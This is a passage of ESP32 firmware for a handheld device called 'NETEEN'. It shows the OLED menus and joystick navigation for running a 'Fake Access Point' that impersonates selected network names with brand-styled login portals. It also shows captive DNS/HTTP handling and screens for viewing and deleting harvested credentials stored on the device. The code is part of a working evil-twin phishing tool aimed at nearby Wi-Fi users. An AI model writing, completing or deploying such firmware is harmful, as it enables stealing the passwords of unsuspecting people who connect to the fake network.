  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 24); display.println(F("scanning WiFi..."));
  display.display();

  bool wasAp = apRunning;
  if (wasAp) stopFakeAP();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(80);
  int n = WiFi.scanNetworks(false, false);
  scanCount = 0;
  if (n > 0) {
    int lim = n < MAX_SCAN ? n : MAX_SCAN;
    for (int i = 0; i < lim; i++) {
      scanSSID[i] = WiFi.SSID(i);
      if (!scanSSID[i].length()) scanSSID[i] = "(hidden)";
      scanRSSI[i] = WiFi.RSSI(i);
      scanChan[i] = WiFi.channel(i);
      scanCount++;
    }
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  delay(50);
  if (wasAp) startFakeAP(selectedSSID);
  screenLocked = false;
  serialLog("scan done: " + String(scanCount));
}

// ==================== OLED BRAND ICONS (20x20) ====================
void drawBrandIcon(int x, int y, int idx, uint16_t fg) {
  uint16_t bg = (fg == SSD1306_WHITE) ? SSD1306_BLACK : SSD1306_WHITE;
  switch (idx) {
    case 0:
      display.drawCircle(x+6, y+6, 5, fg);
      display.fillRect(x+5, y+2, 3, 8, fg);
      break;
    case 1:
      display.fillCircle(x+6, y+6, 6, fg);
      display.setTextColor(bg);
      display.setTextSize(1);
      display.setCursor(x+4, y+3);
      display.print("f");
      display.setTextColor(SSD1306_WHITE);
      break;
    case 2:
      display.drawRoundRect(x+1, y+1, 11, 11, 3, fg);
      display.drawCircle(x+6, y+6, 3, fg);
      display.fillCircle(x+10, y+3, 1, fg);
      break;
    case 3:
      display.setTextColor(fg);
      display.setTextSize(1);
      display.setCursor(x+3, y+3);
      display.print("G");
      display.drawFastHLine(x+7, y+7, 5, fg);
      display.drawFastVLine(x+11, y+4, 4, fg);
      display.setTextColor(SSD1306_WHITE);
      break;
    case 4:
      display.fillRect(x+1, y+1, 5, 5, fg);
      display.fillRect(x+7, y+1, 5, 5, fg);
      display.fillRect(x+1, y+7, 5, 5, fg);
      display.fillRect(x+7, y+7, 5, 5, fg);
      break;
    case 5:
      display.drawLine(x+2, y+2, x+11, y+11, fg);
      display.drawLine(x+11, y+2, x+2, y+11, fg);
      break;
    case 6:
      display.drawFastVLine(x+8, y+1, 9, fg);
      display.drawFastVLine(x+9, y+1, 9, fg);
      display.drawFastHLine(x+8, y+1, 3, fg);
      display.fillCircle(x+5, y+10, 3, fg);
      display.fillCircle(x+5, y+10, 1, bg);
      break;
    case 7:
      display.fillCircle(x+6, y+8, 5, fg);
      display.fillRect(x+5, y+2, 2, 3, fg);
      display.drawLine(x+5, y+1, x+6, y+3, fg);
      break;
    case 8:
      display.drawFastVLine(x+2, y+1, 11, fg);
      display.drawFastVLine(x+3, y+1, 11, fg);
      display.drawFastVLine(x+9, y+1, 11, fg);
      display.drawFastVLine(x+10, y+1, 11, fg);
      display.drawLine(x+3, y+1, x+10, y+11, fg);
      break;
    case 9:
      display.drawRect(x+1, y+1, 11, 11, fg);
      display.fillRect(x+3, y+4, 2, 2, fg);
      display.drawFastVLine(x+3, y+7, 4, fg);
      display.drawCircle(x+8, y+7, 2, fg);
      display.drawFastVLine(x+8, y+8, 3, fg);
      break;
  }
}

// ==================== DRAWING ====================
void drawStatusBar() {
  display.drawFastHLine(0, 10, OLED_W, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 2); display.print(F("NETEEN"));
  display.setCursor(OLED_W - 40, 2); display.printf("C:%d", credCount);
}

void drawListMenu(const char* title, const String* items, int count, int selected, bool showBack) {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14); display.print(title);
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  int lines = showBack ? 2 : 3;
  if (selected < scrollTop) scrollTop = selected;
  if (selected > scrollTop + lines - 1) scrollTop = selected - lines + 1;
  if (scrollTop < 0) scrollTop = 0;

  int y = 28;
  for (int i = scrollTop; i < count && i < scrollTop + lines; i++) {
    if (i == selected) { display.fillRect(0, y - 1, OLED_W, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
    else display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, y);
    String s = items[i]; if (s.length() > 20) s = s.substring(0, 20);
    display.print(s);
    y += 10;
  }
  display.setTextColor(SSD1306_WHITE);

  if (showBack) {
    if (selected == count) { display.fillRect(0, y - 1, OLED_W, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
    display.setCursor(2, y); display.print(F("<< Back"));
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(0, OLED_H - 9); display.print(F("press=OK left=back"));
  display.display();
}

// special std list with brand icons
void drawStdList() {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14); display.print(F("Login Style"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  const int lines = 2;
  if (menuIdx < scrollTop) scrollTop = menuIdx;
  if (menuIdx > scrollTop + lines - 1) scrollTop = menuIdx - lines + 1;
  if (scrollTop < 0) scrollTop = 0;
  // don't let scroll run past end including back row
  int maxTop = (STD_COUNT + 1) - lines;
  if (maxTop < 0) maxTop = 0;
  if (scrollTop > maxTop) scrollTop = maxTop;

  for (int r = 0; r < lines; r++) {
    int i = scrollTop + r;
    if (i >= STD_COUNT + 1) break;

    int y = 28 + r * 15; // 15px per row for 20x20 icon + margin

    // highlight bg
    if (i == menuIdx) {
      display.fillRect(0, y - 1, OLED_W, 14, SSD1306_WHITE);
    }

    if (i < STD_COUNT) {
      // draw icon at x=2
      uint16_t ic = (i == menuIdx) ? SSD1306_BLACK : SSD1306_WHITE;
      drawBrandIcon(2, y - 1, i, ic);
      // invert icon if highlighted? gfx doesn't easily do that - just leave
      // text at x=24
      display.setCursor(24, y + 2);
      display.setTextColor(i == menuIdx ? SSD1306_BLACK : SSD1306_WHITE);
      String s = STD_STYLES[i].name;
      if (s.length() > 15) s = s.substring(0, 15);
      display.print(s);
    } else {
      display.setCursor(24, y + 2);
      display.setTextColor(i == menuIdx ? SSD1306_BLACK : SSD1306_WHITE);
      display.print(F("<< Back"));
    }
    display.setTextColor(SSD1306_WHITE);
  }

  display.setCursor(0, OLED_H - 9);
  display.setTextColor(SSD1306_WHITE);
  display.print(F("press=OK left=back"));
  display.display();
}

void drawMain() {
  String items[8];
  int c = 0;
  items[c++] = "Fake Access Point";
  items[c++] = "WiFi Scanner";
  items[c++] = "View Credentials";
  items[c++] = "Delete Credentials";
  items[c++] = "System Info";
  if (apRunning) items[c++] = "** STOP FAKE AP **";
  items[c++] = "Exit";
  drawListMenu("Main Menu", items, c, menuIdx, false);
}

void drawApMode() {
  String items[2] = { "Standard (Presets)", "Custom (Build Your Own)" };
  drawListMenu("Fake AP Mode", items, 2, menuIdx, true);
}

void drawCustomColor() {
  String items[COLOR_COUNT];
  for (int i = 0; i < COLOR_COUNT; i++) items[i] = COLORS_NAME[i];
  drawListMenu("Portal Color", items, COLOR_COUNT, menuIdx, true);
}

void drawCustomField1() {
  String items[FIELD_COUNT];
  for (int i = 0; i < FIELD_COUNT; i++) items[i] = FIELD_LABELS[i];
  drawListMenu("Field 1", items, FIELD_COUNT, menuIdx, true);
}

void drawCustomField2() {
  String items[FIELD_COUNT];
  for (int i = 0; i < FIELD_COUNT; i++) items[i] = FIELD_LABELS[i];
  drawListMenu("Field 2", items, FIELD_COUNT, menuIdx, true);
}

void drawCategoryMenu() {
  String items[CAT_COUNT];
  for (int i = 0; i < CAT_COUNT; i++) items[i] = CATS[i];
  drawListMenu("Category", items, CAT_COUNT, menuIdx, true);
}

void drawSSIDMenu() {
  int catIdx = 0;
  for (int i = 0; i < CAT_COUNT; i++) if (selectedCategory == CATS[i]) { catIdx = i; break; }
  String items[10];
  for (int i = 0; i < 10; i++) items[i] = SSIDS[catIdx][i];
  drawListMenu("Select SSID", items, 10, menuIdx, true);
}

void drawRunning() {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14); display.println(F("FAKE AP RUNNING"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  display.setCursor(0, 28);
  display.print(F("SSID: "));
  String s = selectedSSID; if (s.length() > 14) s = s.substring(0, 14);
  display.println(s);

  display.setCursor(0, 38);
  display.print(F("IP: ")); display.println(WiFi.softAPIP().toString());

  display.setCursor(0, 48);
  display.print(F("Clients:")); display.print(WiFi.softAPgetStationNum());
  display.print(F(" Creds:")); display.println(credCount);

  display.setCursor(0, OLED_H - 9); display.print(F("left=STOP AP"));

  if (lastCredLine.length() && (millis() - lastCredAt) < 5000) {
    display.fillRect(0, 55, OLED_W, 9, SSD1306_BLACK);
    display.setCursor(0, 56);
    String t = lastCredLine;
    if (t.length() > 21) t = t.substring(0, 21);
    display.print(t);
  }
  display.display();
}

void drawCredsList() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14);
  display.print(F("Credentials (")); display.print(credFileCount); display.println(F(")"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  if (credFileCount == 0) {
    display.setCursor(0, 34); display.println(F("No captures yet"));
    display.setCursor(0, OLED_H - 9); display.print(F("left=back"));
    display.display(); return;
  }

  int lines = 3;
  if (menuIdx < scrollTop) scrollTop = menuIdx;
  if (menuIdx > scrollTop + lines - 1) scrollTop = menuIdx - lines + 1;
  if (scrollTop < 0) scrollTop = 0;

  int y = 28;
  for (int i = scrollTop; i < credFileCount && i < scrollTop + lines; i++) {
    if (i == menuIdx) { display.fillRect(0, y - 1, OLED_W, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
    else display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, y);
    String s = credFiles[i]; if (s.length() > 20) s = s.substring(0, 20);
    display.print(s); y += 10;
  }
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, OLED_H - 9); display.print(F("press=view left=back"));
  display.display();
}

void drawCredView() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 12);
  String t = viewingFile; if (t.length() > 21) t = t.substring(0, 21);
  display.println(t);
  display.drawFastHLine(0, 22, OLED_W, SSD1306_WHITE);

  String content = readFile("/creds/" + viewingFile);

  static String vlines[120];
  int total = 0;
  const int WIDTH = 20;
  String cur = "";

  for (unsigned int i = 0; i < content.length() && total < 120; i++) {
    char c = content[i];
    if (c == '\n') {
      if (cur.length() == 0) {
        vlines[total++] = "";
      } else {
        while (cur.length() > 0 && total < 120) {
          int chunk = cur.length();
          if (chunk > WIDTH) chunk = WIDTH;
          vlines[total++] = cur.substring(0, chunk);
          cur = cur.substring(chunk);
        }
      }
      cur = "";
    } else if (c != '\r' && c >= 32 && c <= 126) {
      cur += c;
    }
  }
  if (cur.length() && total < 120) {
    while (cur.length() > 0 && total < 120) {
      int chunk = cur.length();
      if (chunk > WIDTH) chunk = WIDTH;
      vlines[total++] = cur.substring(0, chunk);
      cur = cur.substring(chunk);
    }
  }

  const int show = 3;
  int top = viewScroll;
  if (top < 0) top = 0;
  if (top > total - show) top = total - show;
  if (top < 0) top = 0;

  int y = 27;
  for (int i = top; i < total && i < top + show; i++) {
    display.setCursor(0, y);
    display.print(vlines[i]);
    y += 9;
  }
  display.setCursor(0, OLED_H - 9); display.print(F("up/dn=scroll left"));
  display.display();
}

void drawDeleteList() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14);
  display.print(F("Delete (")); display.print(credFileCount); display.println(F(")"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  int total = credFileCount + 2;
  int lines = 3;
  if (menuIdx < scrollTop) scrollTop = menuIdx;
  if (menuIdx > scrollTop + lines - 1) scrollTop = menuIdx - lines + 1;
  if (scrollTop < 0) scrollTop = 0;

  int y = 28;
  for (int i = scrollTop; i < total && i < scrollTop + lines; i++) {
    if (i == menuIdx) { display.fillRect(0, y - 1, OLED_W, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
    else display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, y);
    String s;
    if (i < credFileCount) s = credFiles[i];
    else if (i == credFileCount) s = "** DELETE ALL **";
    else s = "<< Back";
    if (s.length() > 20) s = s.substring(0, 20);
    display.print(s); y += 10;
  }
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, OLED_H - 9); display.print(F("press=del left=back"));
  display.display();
}

void drawDeleteConfirm() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 18); display.println(F("Delete this file?"));
  display.setCursor(0, 32);
  String s = viewingFile; if (s.length() > 21) s = s.substring(0, 21);
  display.println(s);
  display.setCursor(0, 48); display.println(F("press=yes left=no"));
  display.display();
}

void drawWiFiScan() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14);
  display.print(F("WiFi (")); display.print(scanCount); display.println(F(")"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  if (scanCount == 0) {
    display.setCursor(0, 34); display.println(F("no networks"));
    display.setCursor(0, OLED_H - 9); display.print(F("press=rescan left"));
    display.display(); return;
  }

  int lines = 3;
  if (menuIdx < scrollTop) scrollTop = menuIdx;
  if (menuIdx > scrollTop + lines - 1) scrollTop = menuIdx - lines + 1;
  if (scrollTop < 0) scrollTop = 0;

  int y = 28;
  for (int i = scrollTop; i < scanCount && i < scrollTop + lines; i++) {
    char buf[24];
    String s = scanSSID[i]; if (s.length() > 12) s = s.substring(0, 12);
    snprintf(buf, sizeof(buf), "%s %ddB", s.c_str(), scanRSSI[i]);
    if (i == menuIdx) { display.fillRect(0, y - 1, OLED_W, 10, SSD1306_WHITE); display.setTextColor(SSD1306_BLACK); }
    else display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, y); display.print(buf); y += 10;
  }
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, OLED_H - 9); display.print(F("press=rescan left"));
  display.display();
}

void drawSysInfo() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 14); display.println(F("System Info"));
  display.drawFastHLine(0, 24, OLED_W, SSD1306_WHITE);

  size_t total = LittleFS.totalBytes(), used = LittleFS.usedBytes();
  display.setCursor(0, 28);
  display.printf("Heap: %u B\n", ESP.getFreeHeap());
  display.printf("FS:   %u/%u\n", (unsigned)used, (unsigned)total);
  display.printf("Cred: %d files\n", credFileCount);
  display.setCursor(0, OLED_H - 9); display.print(F("left=back"));
  display.display();
}

void drawConfirmExit() {
  display.clearDisplay(); drawStatusBar();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 18); display.println(F("Exit to lock screen?"));
  display.setCursor(0, 32); display.println(F("press=yes left=no"));
  display.display();
}

void drawLocked() { display.clearDisplay(); display.display(); }

void redraw() {
  if (screenLocked) return;
  switch (screen) {
    case SCR_MAIN:           drawMain();          break;
    case SCR_AP_MODE:        drawApMode();        break;
    case SCR_STD_LIST:       drawStdList();       break;
    case SCR_CUSTOM_COLOR:   drawCustomColor();   break;
    case SCR_CUSTOM_FIELD1:  drawCustomField1();  break;
    case SCR_CUSTOM_FIELD2:  drawCustomField2();  break;
    case SCR_CATEGORY:       drawCategoryMenu();  break;
    case SCR_SSID:           drawSSIDMenu();      break;
    case SCR_RUNNING:        drawRunning();       break;
    case SCR_CREDS_LIST:     drawCredsList();     break;
    case SCR_CRED_VIEW:      drawCredView();      break;
    case SCR_DELETE_LIST:    drawDeleteList();    break;
    case SCR_DELETE_CONFIRM: drawDeleteConfirm(); break;
    case SCR_WIFI_SCAN:      drawWiFiScan();      break;
    case SCR_SYSINFO:        drawSysInfo();       break;
    case SCR_CONFIRM_EXIT:   drawConfirmExit();   break;
    case SCR_LOCKED:         drawLocked();        break;
  }
}

int listCountForScreen() {
  switch (screen) {
    case SCR_MAIN:          return apRunning ? 7 : 6;
    case SCR_AP_MODE:       return 3;
    case SCR_STD_LIST:      return STD_COUNT + 1;
    case SCR_CUSTOM_COLOR:  return COLOR_COUNT + 1;
    case SCR_CUSTOM_FIELD1: return FIELD_COUNT + 1;
    case SCR_CUSTOM_FIELD2: return FIELD_COUNT + 1;
    case SCR_CATEGORY:      return CAT_COUNT + 1;
    case SCR_SSID:          return 11;
    case SCR_CREDS_LIST:    return credFileCount;
    case SCR_DELETE_LIST:   return credFileCount + 2;
    case SCR_WIFI_SCAN:     return scanCount;
    default:                return 0;
  }
}

void enterMainItem() {
  if (menuIdx == 0) {
    if (apRunning) { screen = SCR_RUNNING; }
    else { menuIdx = 0; scrollTop = 0; screen = SCR_AP_MODE; }
  } else if (menuIdx == 1) { menuIdx = 0; scrollTop = 0; screen = SCR_WIFI_SCAN; doWifiScan(); }
  else if (menuIdx == 2) { menuIdx = 0; scrollTop = 0; refreshCredList(); screen = SCR_CREDS_LIST; }
  else if (menuIdx == 3) { menuIdx = 0; scrollTop = 0; refreshCredList(); screen = SCR_DELETE_LIST; }
  else if (menuIdx == 4) { screen = SCR_SYSINFO; }
  else if (apRunning && menuIdx == 5) { stopFakeAP(); menuIdx = 0; scrollTop = 0; }
  else { screen = SCR_CONFIRM_EXIT; }
  dirty = true;
}

void selectCategory() {
  if (menuIdx >= CAT_COUNT) {
    if (pendingFlow == FLOW_STANDARD) { screen = SCR_STD_LIST; menuIdx = 0; scrollTop = 0; }
    else if (pendingFlow == FLOW_CUSTOM) { screen = SCR_CUSTOM_COLOR; menuIdx = 0; scrollTop = 0; }
    else { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; }
    dirty = true; return;
  }
  selectedCategory = CATS[menuIdx];
  menuIdx = 0; scrollTop = 0;
  screen = SCR_SSID; dirty = true;
}

void selectSSID() {
  if (menuIdx >= 10) { screen = SCR_CATEGORY; menuIdx = 0; scrollTop = 0; dirty = true; return; }
  int catIdx = 0;
  for (int i = 0; i < CAT_COUNT; i++) if (selectedCategory == CATS[i]) { catIdx = i; break; }
  selectedSSID = SSIDS[catIdx][menuIdx];

  if (pendingFlow == FLOW_STANDARD) {
    buildFromStandard(selectedPreset);
    serialLog("AP standard: " + selectedSSID + " style=" + STD_STYLES[selectedPreset].name);
    startFakeAP(selectedSSID);
    screen = SCR_RUNNING;
  } else if (pendingFlow == FLOW_CUSTOM) {
    menuIdx = 0; scrollTop = 0;
    screen = SCR_CUSTOM_FIELD1;
  }
  dirty = true;
}

void handleNav(NavDir dir) {
  if (screenLocked) return;

  if (screen == SCR_LOCKED) {
    if (dir == NAV_PRESS) {
      screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true;
    }
    return;
  }

  if (screen == SCR_RUNNING) {
    if (dir == NAV_LEFT) { stopFakeAP(); screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  if (screen == SCR_CONFIRM_EXIT) {
    if (dir == NAV_PRESS || dir == NAV_RIGHT) { screen = SCR_LOCKED; dirty = true; }
    if (dir == NAV_LEFT) { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  if (screen == SCR_DELETE_CONFIRM) {
    if (dir == NAV_PRESS || dir == NAV_RIGHT) {
      deleteCredFile(viewingFile); menuIdx = 0; scrollTop = 0; screen = SCR_DELETE_LIST; dirty = true;
    }
    if (dir == NAV_LEFT) { screen = SCR_DELETE_LIST; dirty = true; }
    return;
  }

  if (screen == SCR_CRED_VIEW) {
    if (dir == NAV_UP)   { viewScroll--; if (viewScroll < 0) viewScroll = 0; dirty = true; }
    if (dir == NAV_DOWN) { viewScroll++; dirty = true; }
    if (dir == NAV_LEFT) { screen = SCR_CREDS_LIST; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  if (screen == SCR_SYSINFO) {
    if (dir == NAV_LEFT) { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  if (screen == SCR_WIFI_SCAN) {
    if (dir == NAV_PRESS || dir == NAV_RIGHT) { menuIdx = 0; scrollTop = 0; doWifiScan(); dirty = true; }
    if (dir == NAV_LEFT) { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    if (dir == NAV_UP && scanCount > 0)   { menuIdx--; if (menuIdx < 0) menuIdx = scanCount - 1; dirty = true; }
    if (dir == NAV_DOWN && scanCount > 0) { menuIdx++; if (menuIdx >= scanCount) menuIdx = 0; dirty = true; }
    return;
  }

  if (screen == SCR_CREDS_LIST) {
    int cnt = credFileCount;
    if (dir == NAV_UP && cnt > 0)   { menuIdx--; if (menuIdx < 0) menuIdx = cnt - 1; dirty = true; }
    if (dir == NAV_DOWN && cnt > 0) { menuIdx++; if (menuIdx >= cnt) menuIdx = 0; dirty = true; }
    if ((dir == NAV_PRESS || dir == NAV_RIGHT) && cnt > 0) {
      viewingFile = credFiles[menuIdx]; viewScroll = 0; screen = SCR_CRED_VIEW; dirty = true;
    }
    if (dir == NAV_LEFT) { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  if (screen == SCR_DELETE_LIST) {
    int total = credFileCount + 2;
    if (dir == NAV_UP)   { menuIdx--; if (menuIdx < 0) menuIdx = total - 1; dirty = true; }
    if (dir == NAV_DOWN) { menuIdx++; if (menuIdx >= total) menuIdx = 0; dirty = true; }
    if (dir == NAV_PRESS || dir == NAV_RIGHT) {
      if (menuIdx < credFileCount) {
        viewingFile = credFiles[menuIdx]; screen = SCR_DELETE_CONFIRM; dirty = true;
      } else if (menuIdx == credFileCount) {
        deleteAllCreds(); menuIdx = 0; scrollTop = 0; dirty = true;
      } else {
        screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true;
      }
    }
    if (dir == NAV_LEFT) { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; dirty = true; }
    return;
  }

  int cnt = listCountForScreen();
  if (cnt <= 0) return;

  if (dir == NAV_UP)        { menuIdx--; if (menuIdx < 0) menuIdx = cnt - 1; dirty = true; }
  else if (dir == NAV_DOWN) { menuIdx++; if (menuIdx >= cnt) menuIdx = 0; dirty = true; }
  else if (dir == NAV_LEFT) {
    if (screen == SCR_MAIN)          screen = SCR_CONFIRM_EXIT;
    else if (screen == SCR_AP_MODE)  { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; }
    else if (screen == SCR_STD_LIST) { screen = SCR_AP_MODE; menuIdx = 0; scrollTop = 0; }
    else if (screen == SCR_CUSTOM_COLOR) { screen = SCR_AP_MODE; menuIdx = 0; scrollTop = 0; }
    else if (screen == SCR_CUSTOM_FIELD1) { screen = SCR_SSID; menuIdx = 0; scrollTop = 0; }
    else if (screen == SCR_CUSTOM_FIELD2) { screen = SCR_CUSTOM_FIELD1; menuIdx = 0; scrollTop = 0; }
    else if (screen == SCR_CATEGORY) {
      if (pendingFlow == FLOW_STANDARD) screen = SCR_STD_LIST;
      else if (pendingFlow == FLOW_CUSTOM) screen = SCR_CUSTOM_COLOR;
      else screen = SCR_MAIN;
      menuIdx = 0; scrollTop = 0;
    }
    else if (screen == SCR_SSID) { screen = SCR_CATEGORY; menuIdx = 0; scrollTop = 0; }
    dirty = true;
  } else if (dir == NAV_PRESS || dir == NAV_RIGHT) {
    switch (screen) {
      case SCR_MAIN: enterMainItem(); break;
      case SCR_AP_MODE:
        if (menuIdx == 0) { pendingFlow = FLOW_STANDARD; menuIdx = 0; scrollTop = 0; screen = SCR_STD_LIST; }
        else if (menuIdx == 1) { pendingFlow = FLOW_CUSTOM; menuIdx = 0; scrollTop = 0; screen = SCR_CUSTOM_COLOR; }
        else { screen = SCR_MAIN; menuIdx = 0; scrollTop = 0; }
        break;
      case SCR_STD_LIST:
        if (menuIdx >= STD_COUNT) { screen = SCR_AP_MODE; menuIdx = 0; scrollTop = 0; }
        else { selectedPreset = menuIdx; menuIdx = 0; scrollTop = 0; screen = SCR_CATEGORY; }
        break;
      case SCR_CUSTOM_COLOR:
        if (menuIdx >= COLOR_COUNT) { screen = SCR_AP_MODE; menuIdx = 0; scrollTop = 0; }
        else { selectedColor = menuIdx; menuIdx = 0; scrollTop = 0; screen = SCR_CATEGORY; }
        break;
      case SCR_CUSTOM_FIELD1:
        if (menuIdx >= FIELD_COUNT) { screen = SCR_SSID; menuIdx = 0; scrollTop = 0; }
        else { selectedField1 = menuIdx; menuIdx = 0; scrollTop = 0; screen = SCR_CUSTOM_FIELD2; }
        break;
      case SCR_CUSTOM_FIELD2:
        if (menuIdx >= FIELD_COUNT) { screen = SCR_CUSTOM_FIELD1; menuIdx = 0; scrollTop = 0; }
        else {
          selectedField2 = menuIdx;
          buildFromCustom();
          serialLog("AP custom: " + selectedSSID + " color=" + COLORS_NAME[selectedColor]);
          startFakeAP(selectedSSID);
          screen = SCR_RUNNING;
        }
        break;
      case SCR_CATEGORY: selectCategory(); break;
      case SCR_SSID:     selectSSID();     break;
    }
    dirty = true;
  }
}

NavDir readJoystick() {
  int x = analogRead(PIN_JOY_X);
  int y = analogRead(PIN_JOY_Y);
  bool sw = digitalRead(PIN_JOY_SW);

  if (sw == LOW && lastSwState == HIGH) { lastSwState = sw; return NAV_PRESS; }
  lastSwState = sw;

  NavDir dir = NAV_NONE;
  if (y > JOY_ACTIVE_HI)      dir = NAV_DOWN;
  else if (y < JOY_ACTIVE_LO) dir = NAV_UP;
  else if (x > JOY_ACTIVE_HI) dir = NAV_RIGHT;
  else if (x < JOY_ACTIVE_LO) dir = NAV_LEFT;

  return dir;
}

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println();
  Serial.println(F("[NETEEN] booting"));

  pinMode(PIN_JOY_SW, INPUT_PULLUP);
  analogReadResolution(12);
  analogSetPinAttenuation(PIN_JOY_X, ADC_11db);
  analogSetPinAttenuation(PIN_JOY_Y, ADC_11db);

  Wire.begin(PIN_I2C_SDA, PIN_I2C_SCL);
  if (display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(0, 20);
    display.println(F(" NETEEN"));
    display.println(F(" booting..."));
    display.display();
    serialLog("OLED OK");
  } else serialLog("OLED FAIL");

  if (LittleFS.begin(true)) {
    fsReady = true;
    serialLog("LittleFS mounted");
    if (!LittleFS.exists("/creds")) LittleFS.mkdir("/creds");
    refreshCredList();
    credCount = credFileCount;
  } else { fsReady = false; serialLog("LittleFS fail"); }

  serialLog("Joystick: X=34 Y=35 SW=32");
  buildFromStandard(0);

  delay(200);
  Serial.print("JOY center: X="); Serial.print(analogRead(PIN_JOY_X));
  Serial.print(" Y="); Serial.println(analogRead(PIN_JOY_Y));

  delay(400);
  screen = SCR_MAIN; menuIdx = 0; dirty = true;
  redraw();
}

void loop() {
  if (apRunning) {
    dnsServer.processNextRequest();
    httpServer.handleClient();
  }

  NavDir dir = readJoystick();
  uint32_t now = millis();

  if (dir != NAV_NONE) {
    if (dir != lastDir) {
      handleNav(dir);
      lastDir = dir;
      lastNavMs = now;
    } else if (now - lastNavMs > 400) {
      handleNav(dir);
      lastNavMs = now;
    }
  } else {
    lastDir = NAV_NONE;
  }

  static uint32_t lastDraw = 0;
  uint32_t interval = (screen == SCR_RUNNING) ? 500 : 1000;
  if (dirty || (now - lastDraw > interval)) {
    lastDraw = now;
    redraw();
    dirty = false;
  }

  delay(20);
}
